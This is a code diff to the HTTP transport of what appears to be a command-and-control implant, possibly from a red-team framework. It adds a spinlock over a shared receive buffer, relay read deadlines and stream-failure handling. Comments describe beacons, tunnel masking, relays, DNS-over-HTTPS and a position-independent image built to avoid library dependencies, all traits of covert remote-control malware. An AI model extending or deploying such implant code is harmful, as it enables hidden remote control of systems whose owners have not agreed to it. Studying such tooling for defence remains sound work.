@@ -41,7 +41,23 @@ typedef struct {
   size_t plen;
   size_t poff;
   const c2_agent_config *cfg; /* CA and DoH settings */
+  /* Non-zero when a relay set a read deadline (see hp_set_timeout); the main
+   * message tunnel leaves it at 0 and keeps the configured poll window. */
+  long read_timeout_s;
+  /* Atomic spinlock over pending/plen/poff. A relay reads and writes the same
+   * stream from two threads, and a spinlock keeps pthread out of the agent's
+   * host call graph (a raw PIC image has no -pthread DT_NEEDED to resolve). */
+  volatile int pending_lock;
 } hp_ctx;
+
+static void hp_lock(hp_ctx *h) {
+  while (__atomic_test_and_set(&h->pending_lock, __ATOMIC_ACQUIRE))
+    ;
+}
+
+static void hp_unlock(hp_ctx *h) {
+  __atomic_clear(&h->pending_lock, __ATOMIC_RELEASE);
+}
 
 static void hdr_free(hdr_list *h) {
   for (size_t i = 0; i < h->count; i++)
@@ -227,6 +243,8 @@ static int hp_request(hp_ctx *h, int kind, const uint8_t *body, size_t body_len,
   req.resp_len = resp_len;
   req.status = status;
   req.timeout_s = (kind == HP_REQ_READ) ? hp_read_timeout_s(h->cfg) : 30;
+  if (kind == HP_REQ_READ && h->read_timeout_s > 0)
+    req.timeout_s = h->read_timeout_s;
   req.ca_pem = &h->cfg->ca_pem;
   req.doh_server = &h->cfg->doh_server;
 
@@ -237,12 +255,20 @@ static int hp_request(hp_ctx *h, int kind, const uint8_t *body, size_t body_len,
 
 /* ---- c2_stream ops ---- */
 
+/* Milliseconds between two monotonic timestamps. */
+static long long elapsed_ms(const struct timespec *from,
+                            const struct timespec *to) {
+  return (long long)(to->tv_sec - from->tv_sec) * 1000 +
+         (long long)(to->tv_nsec - from->tv_nsec) / 1000000;
+}
+
 static long hp_read(void *ctx, uint8_t *buf, size_t cap) {
   hp_ctx *h = (hp_ctx *)ctx;
   uint8_t *resp = (uint8_t *)malloc(64u * 1024u);
   if (resp == NULL)
     return C2_ERR_NOMEM;
   for (;;) {
+    hp_lock(h);
     if (h->poff < h->plen) {
       size_t n = h->plen - h->poff;
       if (n > cap)
@@ -251,17 +277,35 @@ static long hp_read(void *ctx, uint8_t *buf, size_t cap) {
       h->poff += n;
       if (h->poff == h->plen)
         h->poff = h->plen = 0;
+      hp_unlock(h);
       free(resp);
       return (long)n;
     }
+    hp_unlock(h);
+
     size_t rlen = 0;
     long status = 0;
+    struct timespec started;
+    int timed = h->read_timeout_s > 0;
+    if (timed)
+      clock_gettime(CLOCK_MONOTONIC, &started);
     if (hp_request(h, HP_REQ_READ, NULL, 0, resp, 64u * 1024u, &rlen,
                    &status) != 0) {
-      /* Read window expired or the network failed. Hand control back so the
-       * agent can close the tunnel and mask; the next beacon reconnects. */
+      if (!timed) {
+        /* Read window expired or the network failed. Hand control back so the
+         * agent can close the tunnel and mask; the next beacon reconnects. */
+        free(resp);
+        return C2_STREAM_IDLE;
+      }
+      /* A relay read has a deadline, so a fast failure is not a long-poll
+       * timeout: the C2 refused or reset the stream and the relay must stop
+       * instead of spinning on a dead connection. */
+      struct timespec now;
+      clock_gettime(CLOCK_MONOTONIC, &now);
+      long long budget_ms = h->read_timeout_s * 1000;
       free(resp);
-      return C2_STREAM_IDLE;
+      return elapsed_ms(&started, &now) + 1000 < budget_ms ? C2_ERR_IO
+                                                           : C2_STREAM_IDLE;
     }
     if (status == 404) {
       /* The server closed the stream (the Go channel wrapper treats 404 as a
@@ -275,7 +319,10 @@ static long hp_read(void *ctx, uint8_t *buf, size_t cap) {
       return C2_ERR_IO;
     }
     if (rlen > 0) {
-      if (pending_append(h, resp, rlen) != 0) {
+      hp_lock(h);
+      int rc = pending_append(h, resp, rlen);
+      hp_unlock(h);
+      if (rc != 0) {
         free(resp);
         return C2_ERR_NOMEM;
       }
@@ -302,12 +349,31 @@ static long hp_write(void *ctx, const uint8_t *buf, size_t len) {
     return C2_ERR_IO;
   }
   /* A write response may carry read-side data; queue it. */
-  if (rlen > 0 && pending_append(h, resp, rlen) != 0) {
-    free(resp);
-    return C2_ERR_NOMEM;
+  if (rlen > 0) {
+    hp_lock(h);
+    int queued = pending_append(h, resp, rlen);
+    hp_unlock(h);
+    if (queued != 0) {
+      free(resp);
+      return C2_ERR_NOMEM;
+    }
   }
   free(resp);
   return (long)len;
+}
+
+/* Bound the long-poll window of a relay stream. The main message tunnel never
+ * calls this, so it keeps using the configured poll window. */
+static int hp_set_timeout(void *ctx, int seconds) {
+  hp_ctx *h = (hp_ctx *)ctx;
+  if (h == NULL)
+    return -1;
+  if (seconds < 1)
+    seconds = 1;
+  if (seconds > 3600)
+    seconds = 3600;
+  h->read_timeout_s = seconds;
+  return 0;
 }
 
 static void hp_close(void *ctx) {
@@ -326,7 +392,8 @@ static void hp_close(void *ctx) {
   free(h);
 }
 
-static const c2_stream_ops hp_ops = {hp_read, hp_write, hp_close};
+static const c2_stream_ops hp_ops = {hp_read, hp_write, hp_close,
+                                     hp_set_timeout};
 
 static c2_status hp_open(void *ctx, const char *url,
                          const c2_http_profile *profile, c2_stream *out) {
